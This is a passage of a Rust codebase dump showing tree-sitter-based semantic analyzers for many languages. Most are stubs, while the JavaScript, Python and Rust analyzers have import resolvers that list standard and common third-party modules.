    AnalysisResult, LanguageAnalyzer, SemanticContext, SemanticResult,
};
use std::path::Path;
use tree_sitter::Parser;

#[allow(clippy::new_without_default)]
pub struct ElmAnalyzer {
    #[allow(dead_code)]
    #[allow(dead_code)]
    parser: Parser,
}

impl ElmAnalyzer {
    pub fn new() -> Self {
        let parser = Parser::new();
        // Note: tree_sitter_elm::language() would be used here when the crate is added
        // parser.set_language(tree_sitter_elm::language()).unwrap();
        Self { parser }
    }
}

impl LanguageAnalyzer for ElmAnalyzer {
    fn language_name(&self) -> &'static str {
        "Elm"
    }

    fn analyze_file(
        &self,
        _path: &Path,
        _content: &str,
        _context: &SemanticContext,
    ) -> SemanticResult<AnalysisResult> {
        // TODO: Implement Elm analysis
        Ok(AnalysisResult::default())
    }

    fn can_handle_extension(&self, extension: &str) -> bool {
        matches!(extension, "elm")
    }

    fn supported_extensions(&self) -> Vec<&'static str> {
        vec!["elm"]
    }
}
```

## src/core/semantic/languages/go.rs

Imports: crate, std::path::Path, tree_sitter::Parser

Type references: std::path::Path.Path, tree_sitter::Parser.Parser, GoAnalyzer, tree_sitter::Parser.Parser, tree_sitter::Parser.Parser, GoAnalyzer, Self, Self, Self, crate.LanguageAnalyzer, GoAnalyzer, std::path::Path.Path, std::path::Path.Path, crate.SemanticContext, crate.SemanticContext, crate.SemanticResult, crate.SemanticResult, crate.SemanticResult, crate.AnalysisResult

```rust
//! Semantic analyzer for Go

use crate::core::semantic::analyzer::{
    AnalysisResult, LanguageAnalyzer, SemanticContext, SemanticResult,
};
use std::path::Path;
use tree_sitter::Parser;

#[allow(clippy::new_without_default)]
pub struct GoAnalyzer {
    #[allow(dead_code)]
    #[allow(dead_code)]
    parser: Parser,
}

impl GoAnalyzer {
    pub fn new() -> Self {
        let parser = Parser::new();
        // Note: tree_sitter_go::language() would be used here when the crate is added
        // parser.set_language(tree_sitter_go::language()).unwrap();
        Self { parser }
    }
}

impl LanguageAnalyzer for GoAnalyzer {
    fn language_name(&self) -> &'static str {
        "Go"
    }

    fn analyze_file(
        &self,
        _path: &Path,
        _content: &str,
        _context: &SemanticContext,
    ) -> SemanticResult<AnalysisResult> {
        // TODO: Implement Go analysis
        Ok(AnalysisResult::default())
    }

    fn can_handle_extension(&self, extension: &str) -> bool {
        matches!(extension, "go")
    }

    fn supported_extensions(&self) -> Vec<&'static str> {
        vec!["go"]
    }
}
```

## src/core/semantic/languages/java.rs

Imports: crate, std::path::Path, tree_sitter::Parser

Type references: std::path::Path.Path, tree_sitter::Parser.Parser, JavaAnalyzer, tree_sitter::Parser.Parser, tree_sitter::Parser.Parser, JavaAnalyzer, Self, Self, Self, crate.LanguageAnalyzer, JavaAnalyzer, std::path::Path.Path, std::path::Path.Path, crate.SemanticContext, crate.SemanticContext, crate.SemanticResult, crate.SemanticResult, crate.SemanticResult, crate.AnalysisResult

```rust
//! Semantic analyzer for Java

use crate::core::semantic::analyzer::{
    AnalysisResult, LanguageAnalyzer, SemanticContext, SemanticResult,
};
use std::path::Path;
use tree_sitter::Parser;

#[allow(clippy::new_without_default)]
pub struct JavaAnalyzer {
    #[allow(dead_code)]
    #[allow(dead_code)]
    parser: Parser,
}

impl JavaAnalyzer {
    pub fn new() -> Self {
        let parser = Parser::new();
        // Note: tree_sitter_java::language() would be used here when the crate is added
        // parser.set_language(tree_sitter_java::language()).unwrap();
        Self { parser }
    }
}

impl LanguageAnalyzer for JavaAnalyzer {
    fn language_name(&self) -> &'static str {
        "Java"
    }

    fn analyze_file(
        &self,
        _path: &Path,
        _content: &str,
        _context: &SemanticContext,
    ) -> SemanticResult<AnalysisResult> {
        // TODO: Implement Java analysis
        Ok(AnalysisResult::default())
    }

    fn can_handle_extension(&self, extension: &str) -> bool {
        matches!(extension, "java")
    }

    fn supported_extensions(&self) -> Vec<&'static str> {
        vec!["java"]
    }
}
```

## src/core/semantic/languages/javascript.rs

Imports: crate, crate::utils::error::ContextCreatorError, std::path::Path, tree_sitter::Parser

Type references: crate::utils::error::ContextCreatorError.ContextCreatorError, std::path::Path.Path, tree_sitter::Parser.Parser, JavaScriptAnalyzer, QueryEngine, QueryEngine, JavaScriptAnalyzer, Self, Self, Self, crate.LanguageAnalyzer, JavaScriptAnalyzer, std::path::Path.Path, std::path::Path.Path, crate.SemanticContext, crate.SemanticContext, crate.SemanticResult, crate.SemanticResult, crate.SemanticResult, AnalysisResult, JavaScriptModuleResolver, ModuleResolver, JavaScriptModuleResolver, std::path::Path.Path, std::path::Path.Path, std::path::Path.Path, std::path::Path.Path, ResolvedPath, crate::utils::error::ContextCreatorError.ContextCreatorError, ResolvedPath, ResolvedPath, ResolvedPath, ResolvedPath, ResolvedPath, ResolvedPath

```rust
//! Semantic analyzer for JavaScript

use crate::core::semantic::{
    analyzer::{AnalysisResult, LanguageAnalyzer, SemanticContext, SemanticResult},
    path_validator::{validate_import_path, validate_module_name},
    query_engine::QueryEngine,
    resolver::{ModuleResolver, ResolvedPath},
};
use crate::utils::error::ContextCreatorError;
use std::path::Path;
use tree_sitter::Parser;

#[allow(clippy::new_without_default)]
pub struct JavaScriptAnalyzer {
    query_engine: QueryEngine,
}

impl JavaScriptAnalyzer {
    pub fn new() -> Self {
        let language = tree_sitter_javascript::language();
        let query_engine = QueryEngine::new(language, "javascript")
            .expect("Failed to create JavaScript query engine");
        Self { query_engine }
    }
}

impl LanguageAnalyzer for JavaScriptAnalyzer {
    fn language_name(&self) -> &'static str {
        "JavaScript"
    }

    fn analyze_file(
        &self,
        path: &Path,
        content: &str,
        context: &SemanticContext,
    ) -> SemanticResult<AnalysisResult> {
        let mut parser = Parser::new();
        parser
            .set_language(tree_sitter_javascript::language())
            .map_err(|e| ContextCreatorError::ParseError(format!("Failed to set language: {e}")))?;

        let mut result = self
            .query_engine
            .analyze_with_parser(&mut parser, content)?;

        // Resolve type definitions for the type references found
        self.query_engine.resolve_type_definitions(
            &mut result.type_references,
            path,
            &context.base_dir,
        )?;

        Ok(result)
    }

    fn can_handle_extension(&self, extension: &str) -> bool {
        extension == "js" || extension == "jsx"
    }

    fn supported_extensions(&self) -> Vec<&'static str> {
        vec!["js", "jsx"]
    }
}

pub struct JavaScriptModuleResolver;

impl ModuleResolver for JavaScriptModuleResolver {
    fn resolve_import(
        &self,
        module_path: &str,
        from_file: &Path,
        base_dir: &Path,
    ) -> Result<ResolvedPath, ContextCreatorError> {
        // Validate module name for security
        validate_module_name(module_path)?;

        // Handle Node.js built-in modules
        if self.is_external_module(module_path) {
            return Ok(ResolvedPath {
                path: base_dir.join("package.json"), // Point to package.json as indicator
                is_external: true,
                confidence: 1.0,
            });
        }

        // Handle relative imports (./, ../)
        if module_path.starts_with('.') {
            if let Some(parent) = from_file.parent() {
                let resolved_path = parent.join(module_path);

                // Try different extensions
                for ext in &["js", "jsx", "ts", "tsx"] {
                    let with_ext = resolved_path.with_extension(ext);
                    if with_ext.exists() {
                        let validated_path = validate_import_path(base_dir, &with_ext)?;
                        return Ok(ResolvedPath {
                            path: validated_path,
                            is_external: false,
                            confidence: 0.9,
                        });
                    }
                }

                // Try as directory with index file
                for ext in &["js", "jsx", "ts", "tsx"] {
                    let index_path = resolved_path.join(format!("index.{ext}"));
                    if index_path.exists() {
                        let validated_path = validate_import_path(base_dir, &index_path)?;
                        return Ok(ResolvedPath {
                            path: validated_path,
                            is_external: false,
                            confidence: 0.9,
                        });
                    }
                }
            }
        }

        // Handle absolute imports from node_modules or project root
        let search_paths = vec![
            base_dir.to_path_buf(),
            from_file.parent().unwrap_or(base_dir).to_path_buf(),
        ];

        for search_path in &search_paths {
            // Try as a file
            for ext in &["js", "jsx", "ts", "tsx"] {
                let file_path = search_path.join(format!("{module_path}.{ext}"));
                if file_path.exists() {
                    let validated_path = validate_import_path(base_dir, &file_path)?;
                    return Ok(ResolvedPath {
                        path: validated_path,
                        is_external: false,
                        confidence: 0.8,
                    });
                }
            }

            // Try as a directory with index file
            for ext in &["js", "jsx", "ts", "tsx"] {
                let index_path = search_path.join(module_path).join(format!("index.{ext}"));
                if index_path.exists() {
                    let validated_path = validate_import_path(base_dir, &index_path)?;
                    return Ok(ResolvedPath {
                        path: validated_path,
                        is_external: false,
                        confidence: 0.8,
                    });
                }
            }
        }

        // Otherwise, assume it's an external package
        Ok(ResolvedPath {
            path: base_dir.join("package.json"),
            is_external: true,
            confidence: 0.5,
        })
    }

    fn get_file_extensions(&self) -> Vec<&'static str> {
        vec!["js", "jsx"]
    }

    fn is_external_module(&self, module_path: &str) -> bool {
        // Node.js built-in modules
        let builtin_modules = [
            "assert",
            "buffer",
            "child_process",
            "cluster",
            "crypto",
            "dgram",
            "dns",
            "domain",
            "events",
            "fs",
            "http",
            "https",
            "net",
            "os",
            "path",
            "punycode",
            "querystring",
            "readline",
            "repl",
            "stream",
            "string_decoder",
            "tls",
            "tty",
            "url",
            "util",
            "v8",
            "vm",
            "zlib",
            "process",
            "console",
            "timers",
            "module",
        ];

        // Common npm packages
        let common_packages = [
            "react",
            "react-dom",
            "vue",
            "angular",
            "lodash",
            "express",
            "next",
            "webpack",
            "babel",
            "eslint",
            "typescript",
            "jest",
            "mocha",
            "chai",
            "sinon",
            "axios",
            "moment",
            "dayjs",
            "socket.io",
            "cors",
            "helmet",
            "bcrypt",
            "jsonwebtoken",
            "passport",
            "multer",
            "nodemailer",
            "mongoose",
            "sequelize",
            "prisma",
            "graphql",
            "apollo",
            "redux",
            "mobx",
            "zustand",
            "styled-components",
            "emotion",
            "tailwindcss",
        ];

        let first_part = module_path.split('/').next().unwrap_or("");
        builtin_modules.contains(&first_part) || common_packages.contains(&first_part)
    }
}
```

## src/core/semantic/languages/julia.rs

Imports: crate, std::path::Path, tree_sitter::Parser

Type references: std::path::Path.Path, tree_sitter::Parser.Parser, JuliaAnalyzer, tree_sitter::Parser.Parser, tree_sitter::Parser.Parser, JuliaAnalyzer, Self, Self, Self, crate.LanguageAnalyzer, JuliaAnalyzer, std::path::Path.Path, std::path::Path.Path, crate.SemanticContext, crate.SemanticContext, crate.SemanticResult, crate.SemanticResult, crate.SemanticResult, crate.AnalysisResult

```rust
//! Semantic analyzer for Julia

use crate::core::semantic::analyzer::{
    AnalysisResult, LanguageAnalyzer, SemanticContext, SemanticResult,
};
use std::path::Path;
use tree_sitter::Parser;

#[allow(clippy::new_without_default)]
pub struct JuliaAnalyzer {
    #[allow(dead_code)]
    #[allow(dead_code)]
    parser: Parser,
}

impl JuliaAnalyzer {
    pub fn new() -> Self {
        let parser = Parser::new();
        // Note: tree_sitter_julia::language() would be used here when the crate is added
        // parser.set_language(tree_sitter_julia::language()).unwrap();
        Self { parser }
    }
}

impl LanguageAnalyzer for JuliaAnalyzer {
    fn language_name(&self) -> &'static str {
        "Julia"
    }

    fn analyze_file(
        &self,
        _path: &Path,
        _content: &str,
        _context: &SemanticContext,
    ) -> SemanticResult<AnalysisResult> {
        // TODO: Implement Julia analysis
        Ok(AnalysisResult::default())
    }

    fn can_handle_extension(&self, extension: &str) -> bool {
        matches!(extension, "jl")
    }

    fn supported_extensions(&self) -> Vec<&'static str> {
        vec!["jl"]
    }
}
```

## src/core/semantic/languages/kotlin.rs

Imports: crate, std::path::Path, tree_sitter::Parser

Type references: std::path::Path.Path, tree_sitter::Parser.Parser, KotlinAnalyzer, tree_sitter::Parser.Parser, tree_sitter::Parser.Parser, KotlinAnalyzer, Self, Self, Self, crate.LanguageAnalyzer, KotlinAnalyzer, std::path::Path.Path, std::path::Path.Path, crate.SemanticContext, crate.SemanticContext, crate.SemanticResult, crate.SemanticResult, crate.SemanticResult, crate.AnalysisResult

```rust
//! Semantic analyzer for Kotlin

use crate::core::semantic::analyzer::{
    AnalysisResult, LanguageAnalyzer, SemanticContext, SemanticResult,
};
use std::path::Path;
use tree_sitter::Parser;

#[allow(clippy::new_without_default)]
pub struct KotlinAnalyzer {
    #[allow(dead_code)]
    parser: Parser,
}

impl KotlinAnalyzer {
    pub fn new() -> Self {
        let parser = Parser::new();
        // Note: tree_sitter_kotlin::language() would be used here when the crate is added
        // parser.set_language(tree_sitter_kotlin::language()).unwrap();
        Self { parser }
    }
}

impl LanguageAnalyzer for KotlinAnalyzer {
    fn language_name(&self) -> &'static str {
        "Kotlin"
    }

    fn analyze_file(
        &self,
        _path: &Path,
        _content: &str,
        _context: &SemanticContext,
    ) -> SemanticResult<AnalysisResult> {
        // TODO: Implement Kotlin analysis
        Ok(AnalysisResult::default())
    }

    fn can_handle_extension(&self, extension: &str) -> bool {
        extension == "kt" || extension == "kts"
    }

    fn supported_extensions(&self) -> Vec<&'static str> {
        vec!["kt", "kts"]
    }
}
```

## src/core/semantic/languages/lua.rs

Imports: crate, std::path::Path, tree_sitter::Parser

Type references: std::path::Path.Path, tree_sitter::Parser.Parser, LuaAnalyzer, tree_sitter::Parser.Parser, tree_sitter::Parser.Parser, LuaAnalyzer, Self, Self, Self, crate.LanguageAnalyzer, LuaAnalyzer, std::path::Path.Path, std::path::Path.Path, crate.SemanticContext, crate.SemanticContext, crate.SemanticResult, crate.SemanticResult, crate.SemanticResult, crate.AnalysisResult

```rust
//! Semantic analyzer for Lua

use crate::core::semantic::analyzer::{
    AnalysisResult, LanguageAnalyzer, SemanticContext, SemanticResult,
};
use std::path::Path;
use tree_sitter::Parser;

#[allow(clippy::new_without_default)]
pub struct LuaAnalyzer {
    #[allow(dead_code)]
    #[allow(dead_code)]
    parser: Parser,
}

impl LuaAnalyzer {
    pub fn new() -> Self {
        let parser = Parser::new();
        // Note: tree_sitter_lua::language() would be used here when the crate is added
        // parser.set_language(tree_sitter_lua::language()).unwrap();
        Self { parser }
    }
}

impl LanguageAnalyzer for LuaAnalyzer {
    fn language_name(&self) -> &'static str {
        "Lua"
    }

    fn analyze_file(
        &self,
        _path: &Path,
        _content: &str,
        _context: &SemanticContext,
    ) -> SemanticResult<AnalysisResult> {
        // TODO: Implement Lua analysis
        Ok(AnalysisResult::default())
    }

    fn can_handle_extension(&self, extension: &str) -> bool {
        matches!(extension, "lua")
    }

    fn supported_extensions(&self) -> Vec<&'static str> {
        vec!["lua"]
    }
}
```

## src/core/semantic/languages/mod.rs

Imports: c, cpp, csharp, dart, elixir, elm, go, java, javascript, julia, kotlin, lua, php, python, r, ruby, rust, scala, swift, typescript

```rust
//! Language-specific semantic analyzers

pub mod c;
pub mod cpp;
pub mod csharp;
pub mod dart;
pub mod elixir;
pub mod elm;
pub mod go;
pub mod java;
pub mod javascript;
pub mod julia;
pub mod kotlin;
pub mod lua;
pub mod php;
pub mod python;
pub mod r;
pub mod ruby;
pub mod rust;
pub mod scala;
pub mod swift;
pub mod typescript;
```

## src/core/semantic/languages/php.rs

Imports: crate, std::path::Path, tree_sitter::Parser

Type references: std::path::Path.Path, tree_sitter::Parser.Parser, PhpAnalyzer, tree_sitter::Parser.Parser, tree_sitter::Parser.Parser, PhpAnalyzer, Self, Self, Self, crate.LanguageAnalyzer, PhpAnalyzer, std::path::Path.Path, std::path::Path.Path, crate.SemanticContext, crate.SemanticContext, crate.SemanticResult, crate.SemanticResult, crate.SemanticResult, crate.AnalysisResult

```rust
//! Semantic analyzer for Php

use crate::core::semantic::analyzer::{
    AnalysisResult, LanguageAnalyzer, SemanticContext, SemanticResult,
};
use std::path::Path;
use tree_sitter::Parser;

#[allow(clippy::new_without_default)]
pub struct PhpAnalyzer {
    #[allow(dead_code)]
    #[allow(dead_code)]
    parser: Parser,
}

impl PhpAnalyzer {
    pub fn new() -> Self {
        let parser = Parser::new();
        // Note: tree_sitter_php::language() would be used here when the crate is added
        // parser.set_language(tree_sitter_php::language()).unwrap();
        Self { parser }
    }
}

impl LanguageAnalyzer for PhpAnalyzer {
    fn language_name(&self) -> &'static str {
        "Php"
    }

    fn analyze_file(
        &self,
        _path: &Path,
        _content: &str,
        _context: &SemanticContext,
    ) -> SemanticResult<AnalysisResult> {
        // TODO: Implement Php analysis
        Ok(AnalysisResult::default())
    }

    fn can_handle_extension(&self, extension: &str) -> bool {
        matches!(extension, "php")
    }

    fn supported_extensions(&self) -> Vec<&'static str> {
        vec!["php"]
    }
}
```

## src/core/semantic/languages/python.rs

Imports: crate, crate::utils::error::ContextCreatorError, std::path::Path, tree_sitter::Parser

Type references: crate::utils::error::ContextCreatorError.ContextCreatorError, std::path::Path.Path, tree_sitter::Parser.Parser, PythonAnalyzer, QueryEngine, QueryEngine, PythonAnalyzer, Self, Self, Self, crate.LanguageAnalyzer, PythonAnalyzer, std::path::Path.Path, std::path::Path.Path, crate.SemanticContext, crate.SemanticContext, crate.SemanticResult, crate.SemanticResult, crate.SemanticResult, AnalysisResult, PythonModuleResolver, ModuleResolver, PythonModuleResolver, std::path::Path.Path, std::path::Path.Path, std::path::Path.Path, std::path::Path.Path, ResolvedPath, crate::utils::error::ContextCreatorError.ContextCreatorError, ResolvedPath, ResolvedPath, ResolvedPath, ResolvedPath, ResolvedPath, ResolvedPath

```rust
//! Semantic analyzer for Python

use crate::core::semantic::{
    analyzer::{AnalysisResult, LanguageAnalyzer, SemanticContext, SemanticResult},
    path_validator::{validate_import_path, validate_module_name},
    query_engine::QueryEngine,
    resolver::{ModuleResolver, ResolvedPath, ResolverUtils},
};
use crate::utils::error::ContextCreatorError;
use std::path::Path;
use tree_sitter::Parser;

#[allow(clippy::new_without_default)]
pub struct PythonAnalyzer {
    query_engine: QueryEngine,
}

impl PythonAnalyzer {
    pub fn new() -> Self {
        let language = tree_sitter_python::language();
        let query_engine =
            QueryEngine::new(language, "python").expect("Failed to create Python query engine");
        Self { query_engine }
    }
}

impl LanguageAnalyzer for PythonAnalyzer {
    fn language_name(&self) -> &'static str {
        "Python"
    }

    fn analyze_file(
        &self,
        path: &Path,
        content: &str,
        context: &SemanticContext,
    ) -> SemanticResult<AnalysisResult> {
        let mut parser = Parser::new();
        parser
            .set_language(tree_sitter_python::language())
            .map_err(|e| ContextCreatorError::ParseError(format!("Failed to set language: {e}")))?;

        let mut result = self
            .query_engine
            .analyze_with_parser(&mut parser, content)?;

        // Resolve type definitions for the type references found
        self.query_engine.resolve_type_definitions(
            &mut result.type_references,
            path,
            &context.base_dir,
        )?;

        Ok(result)
    }

    fn can_handle_extension(&self, extension: &str) -> bool {
        matches!(extension, "py" | "pyw" | "pyi")
    }

    fn supported_extensions(&self) -> Vec<&'static str> {
        vec!["py", "pyw", "pyi"]
    }
}

pub struct PythonModuleResolver;

impl ModuleResolver for PythonModuleResolver {
    fn resolve_import(
        &self,
        module_path: &str,
        from_file: &Path,
        base_dir: &Path,
    ) -> Result<ResolvedPath, ContextCreatorError> {
        // Validate module name for security
        validate_module_name(module_path)?;

        // Handle standard library imports
        if self.is_external_module(module_path) {
            return Ok(ResolvedPath {
                path: base_dir.join("requirements.txt"), // Point to requirements.txt as indicator
                is_external: true,
                confidence: 1.0,
            });
        }

        // Handle relative imports (., ..)
        if module_path.starts_with('.') {
            let mut level = 0;
            let mut chars = module_path.chars();
            while chars.next() == Some('.') {
                level += 1;
            }

            // Get the rest of the module path after dots
            let rest = &module_path[level..];

            if let Some(parent) = from_file.parent() {
                let mut current = parent;

                // Go up directories based on dot count
                for _ in 1..level {
                    if let Some(p) = current.parent() {
                        current = p;
                    }
                }

                // Resolve the rest of the path
                if !rest.is_empty() {
                    let path = ResolverUtils::module_to_path(rest);
                    let full_path = current.join(path);

                    // Try as a Python file
                    if let Some(resolved) = ResolverUtils::find_with_extensions(&full_path, &["py"])
                    {
                        let validated_path = validate_import_path(base_dir, &resolved)?;
                        return Ok(ResolvedPath {
                            path: validated_path,
                            is_external: false,
                            confidence: 0.9,
                        });
                    }

                    // Try as a package directory with __init__.py
                    let init_path = full_path.join("__init__.py");
                    if init_path.exists() {
                        let validated_path = validate_import_path(base_dir, &init_path)?;
                        return Ok(ResolvedPath {
                            path: validated_path,
                            is_external: false,
                            confidence: 0.9,
                        });
                    }
                }
            }
        }

        // Handle absolute imports
        let parts: Vec<&str> = module_path.split('.').collect();

        // Start from base directory or parent of current file
        let search_paths = vec![
            base_dir.to_path_buf(),
            from_file.parent().unwrap_or(base_dir).to_path_buf(),
        ];

        for search_path in &search_paths {
            let mut current_path = search_path.clone();

            // Build path from module parts
            for (i, part) in parts.iter().enumerate() {
                current_path = current_path.join(part);

                // Check if this is the final part
                if i == parts.len() - 1 {
                    // Try as a Python file
                    let py_file = current_path.with_extension("py");
                    if py_file.exists() {
                        let validated_path = validate_import_path(base_dir, &py_file)?;
                        return Ok(ResolvedPath {
                            path: validated_path,
                            is_external: false,
                            confidence: 0.8,
                        });
                    }

                    // Try as a package directory
                    let init_path = current_path.join("__init__.py");
                    if init_path.exists() {
                        let validated_path = validate_import_path(base_dir, &init_path)?;
                        return Ok(ResolvedPath {
                            path: validated_path,
                            is_external: false,
                            confidence: 0.8,
                        });
                    }
                }
            }
        }

        // Otherwise, assume it's an external package
        Ok(ResolvedPath {
            path: base_dir.join("requirements.txt"),
            is_external: true,
            confidence: 0.5,
        })
    }

    fn get_file_extensions(&self) -> Vec<&'static str> {
        vec!["py", "pyw", "pyi"]
    }

    fn is_external_module(&self, module_path: &str) -> bool {
        // Common standard library modules
        let stdlib_modules = [
            "os",
            "sys",
            "json",
            "math",
            "random",
            "datetime",
            "collections",
            "itertools",
            "functools",
            "re",
            "time",
            "subprocess",
            "pathlib",
            "typing",
            "asyncio",
            "unittest",
            "logging",
            "argparse",
            "urllib",
            "http",
            "email",
            "csv",
            "sqlite3",
            "threading",
            "multiprocessing",
            "abc",
            "enum",
            "dataclasses",
            "contextlib",
            "io",
            "pickle",
            "copy",
            "hashlib",
            "base64",
            "secrets",
            "uuid",
            "platform",
            "socket",
            "ssl",
            "select",
            "queue",
            "struct",
            "array",
            "bisect",
            "heapq",
            "weakref",
            "types",
            "importlib",
            "pkgutil",
            "inspect",
            "ast",
            "dis",
            "traceback",
            "linecache",
            "tokenize",
            "keyword",
            "builtins",
            "__future__",
            "gc",
            "signal",
            "atexit",
            "concurrent",
            "xml",
            "html",
            "urllib",
            "http",
            "ftplib",
            "poplib",
            "imaplib",
            "smtplib",
            "telnetlib",
            "uuid",
            "socketserver",
            "xmlrpc",
            "ipaddress",
            "shutil",
            "tempfile",
            "glob",
            "fnmatch",
            "stat",
            "filecmp",
            "zipfile",
            "tarfile",
            "gzip",
            "bz2",
            "lzma",
            "zlib",
            "configparser",
            "netrc",
            "plistlib",
            "statistics",
            "decimal",
            "fractions",
            "numbers",
            "cmath",
            "operator",
            "difflib",
            "textwrap",
            "unicodedata",
            "stringprep",
            "codecs",
            "encodings",
            "locale",
            "gettext",
            "warnings",
            "pprint",
            "reprlib",
            "graphlib",
        ];

        // Also check common third-party packages that might be imported
        let third_party = [
            "numpy",
            "pandas",
            "requests",
            "flask",
            "django",
            "pytest",
            "matplotlib",
            "scipy",
            "sklearn",
            "tensorflow",
            "torch",
            "beautifulsoup4",
            "selenium",
            "pygame",
            "pillow",
            "sqlalchemy",
            "celery",
            "redis",
            "pymongo",
            "aiohttp",
            "fastapi",
            "pydantic",
            "click",
            "tqdm",
            "colorama",
            "setuptools",
            "pip",
            "wheel",
        ];

        let first_part = module_path.split('.').next().unwrap_or("");
        stdlib_modules.contains(&first_part) || third_party.contains(&first_part)
    }
}
```

## src/core/semantic/languages/r.rs

Imports: crate, std::path::Path, tree_sitter::Parser

Type references: std::path::Path.Path, tree_sitter::Parser.Parser, RAnalyzer, tree_sitter::Parser.Parser, tree_sitter::Parser.Parser, RAnalyzer, Self, Self, Self, crate.LanguageAnalyzer, RAnalyzer, std::path::Path.Path, std::path::Path.Path, crate.SemanticContext, crate.SemanticContext, crate.SemanticResult, crate.SemanticResult, crate.SemanticResult, crate.AnalysisResult

```rust
//! Semantic analyzer for R

use crate::core::semantic::analyzer::{
    AnalysisResult, LanguageAnalyzer, SemanticContext, SemanticResult,
};
use std::path::Path;
use tree_sitter::Parser;

#[allow(clippy::new_without_default)]
pub struct RAnalyzer {
    #[allow(dead_code)]
    parser: Parser,
}

impl RAnalyzer {
    pub fn new() -> Self {
        let parser = Parser::new();
        // Note: tree_sitter_r::language() would be used here when the crate is added
        // parser.set_language(tree_sitter_r::language()).unwrap();
        Self { parser }
    }
}

impl LanguageAnalyzer for RAnalyzer {
    fn language_name(&self) -> &'static str {
        "R"
    }

    fn analyze_file(
        &self,
        _path: &Path,
        _content: &str,
        _context: &SemanticContext,
    ) -> SemanticResult<AnalysisResult> {
        // TODO: Implement R analysis
        Ok(AnalysisResult::default())
    }

    fn can_handle_extension(&self, extension: &str) -> bool {
        extension == "r" || extension == "R"
    }

    fn supported_extensions(&self) -> Vec<&'static str> {
        vec!["r", "R"]
    }
}
```

## src/core/semantic/languages/ruby.rs

Imports: crate, std::path::Path, tree_sitter::Parser

Type references: std::path::Path.Path, tree_sitter::Parser.Parser, RubyAnalyzer, tree_sitter::Parser.Parser, tree_sitter::Parser.Parser, RubyAnalyzer, Self, Self, Self, crate.LanguageAnalyzer, RubyAnalyzer, std::path::Path.Path, std::path::Path.Path, crate.SemanticContext, crate.SemanticContext, crate.SemanticResult, crate.SemanticResult, crate.SemanticResult, crate.AnalysisResult

```rust
//! Semantic analyzer for Ruby

use crate::core::semantic::analyzer::{
    AnalysisResult, LanguageAnalyzer, SemanticContext, SemanticResult,
};
use std::path::Path;
use tree_sitter::Parser;

#[allow(clippy::new_without_default)]
pub struct RubyAnalyzer {
    #[allow(dead_code)]
    #[allow(dead_code)]
    parser: Parser,
}

impl RubyAnalyzer {
    pub fn new() -> Self {
        let parser = Parser::new();
        // Note: tree_sitter_ruby::language() would be used here when the crate is added
        // parser.set_language(tree_sitter_ruby::language()).unwrap();
        Self { parser }
    }
}

impl LanguageAnalyzer for RubyAnalyzer {
    fn language_name(&self) -> &'static str {
        "Ruby"
    }

    fn analyze_file(
        &self,
        _path: &Path,
        _content: &str,
        _context: &SemanticContext,
    ) -> SemanticResult<AnalysisResult> {
        // TODO: Implement Ruby analysis
        Ok(AnalysisResult::default())
    }

    fn can_handle_extension(&self, extension: &str) -> bool {
        matches!(extension, "rb")
    }

    fn supported_extensions(&self) -> Vec<&'static str> {
        vec!["rb"]
    }
}
```

## src/core/semantic/languages/rust.rs

Imports: crate, crate::utils::error::ContextCreatorError, std::path::Path, tree_sitter::Parser, std::collections::HashMap

Type references: crate::utils::error::ContextCreatorError.ContextCreatorError, std::path::Path.Path, tree_sitter::Parser.Parser, RustAnalyzer, QueryEngine, QueryEngine, RustAnalyzer, Self, Self, Self, crate.LanguageAnalyzer, RustAnalyzer, std::path::Path.Path, std::path::Path.Path, crate.SemanticContext, crate.SemanticContext, crate.SemanticResult, crate.SemanticResult, crate.SemanticResult, AnalysisResult, RustAnalyzer, AnalysisResult, AnalysisResult, RustModuleResolver, ModuleResolver, RustModuleResolver, std::path::Path.Path, std::path::Path.Path, std::path::Path.Path, std::path::Path.Path, ResolvedPath, crate::utils::error::ContextCreatorError.ContextCreatorError, ResolvedPath, ResolvedPath, ResolvedPath, ResolvedPath, ResolvedPath, ResolvedPath, ResolvedPath

```rust
//! Semantic analyzer for Rust

use crate::core::semantic::{
    analyzer::{AnalysisResult, LanguageAnalyzer, SemanticContext, SemanticResult},
    path_validator::{validate_import_path, validate_module_name},
    query_engine::QueryEngine,
    resolver::{ModuleResolver, ResolvedPath, ResolverUtils},
};
use crate::utils::error::ContextCreatorError;
use std::path::Path;
use tree_sitter::Parser;

#[allow(clippy::new_without_default)]
pub struct RustAnalyzer {
    query_engine: QueryEngine,
}

impl RustAnalyzer {
    pub fn new() -> Self {
        let language = tree_sitter_rust::language();
        let query_engine =
            QueryEngine::new(language, "rust").expect("Failed to create Rust query engine");
        Self { query_engine }
    }
}

impl LanguageAnalyzer for RustAnalyzer {
    fn language_name(&self) -> &'static str {
        "Rust"
    }

    fn analyze_file(
        &self,
        path: &Path,
        content: &str,
        context: &SemanticContext,
    ) -> SemanticResult<AnalysisResult> {
        let mut parser = Parser::new();
        parser
            .set_language(tree_sitter_rust::language())
            .map_err(|e| ContextCreatorError::ParseError(format!("Failed to set language: {e}")))?;

        let mut result = self
            .query_engine
            .analyze_with_parser(&mut parser, content)?;

        // Correlate type references with imports to populate module information
        self.correlate_types_with_imports(&mut result);

        // Resolve type definitions for the type references found
        self.query_engine.resolve_type_definitions(
            &mut result.type_references,
            path,
            &context.base_dir,
        )?;

        Ok(result)
    }

    fn can_handle_extension(&self, extension: &str) -> bool {
        extension == "rs"
    }

    fn supported_extensions(&self) -> Vec<&'static str> {
        vec!["rs"]
    }
}

impl RustAnalyzer {
    /// Correlate type references with imports to populate module information
    fn correlate_types_with_imports(&self, result: &mut AnalysisResult) {
        use std::collections::HashMap;

        // Create a mapping from imported type names to their module paths
        let mut type_to_module: HashMap<String, String> = HashMap::new();

        for import in &result.imports {
            if import.items.is_empty() {
                // Handle simple imports like "use std::collections::HashMap;"
                if let Some(type_name) = import.module.split("::").last() {
                    // Check if this looks like a type (starts with uppercase)
                    if type_name.chars().next().is_some_and(|c| c.is_uppercase()) {
                        type_to_module.insert(type_name.to_string(), import.module.clone());
                    }
                }
            } else {
                // Handle scoped imports like "use model::{Account, DatabaseFactory};"
                for item in &import.items {
                    // Check if this looks like a type (starts with uppercase)
                    if item.chars().next().is_some_and(|c| c.is_uppercase()) {
                        type_to_module.insert(item.clone(), import.module.clone());
                    }
                }
            }
        }

        // Update type references with module information
        for type_ref in &mut result.type_references {
            if type_ref.module.is_none() {
                if let Some(module_path) = type_to_module.get(&type_ref.name) {
                    type_ref.module = Some(module_path.clone());
                }
            }
        }
    }
}

pub struct RustModuleResolver;

impl ModuleResolver for RustModuleResolver {
    fn resolve_import(
        &self,
        module_path: &str,
        from_file: &Path,
        base_dir: &Path,
